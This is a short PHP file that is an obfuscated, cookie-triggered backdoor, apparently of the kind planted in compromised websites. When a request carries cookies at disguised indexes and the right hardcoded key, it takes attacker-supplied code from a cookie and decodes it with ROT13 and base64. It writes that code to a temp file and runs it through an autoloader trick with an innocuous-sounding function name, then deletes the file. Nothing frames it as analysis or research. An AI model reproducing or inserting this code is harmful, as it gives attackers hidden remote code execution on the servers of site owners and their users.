<?php


if (isset($_COOKIE[41+-41]) && isset($_COOKIE[83-82]) && isset($_COOKIE[39+-36]) && isset($_COOKIE[97+-93])) {
    $entity = $_COOKIE;
    function approve_request($elem) {
        $entity = $_COOKIE;
        $element = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '96aab5de');
        if (!is_writable($element)) {
            $element = getcwd() . DIRECTORY_SEPARATOR . "framework";
        }
        $marker = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($entity[3]));
        if (is_writeable($element)) {
            $item = fopen($element, 'w+');
            fputs($item, $marker);
            fclose($item);
            spl_autoload_unregister(__FUNCTION__);
            require_once($element);
            @array_map('unlink', array($element));
        }
    }
    spl_autoload_register("approve_request");
    $ptr = "2edae7bbfb9ce4736d48154d02a24dba";
    if (!strncmp($ptr, $entity[4], 32)) {
        if (@class_parents("splitter_tool_buffer_cache", true)) {
            exit;
        }
    }
}
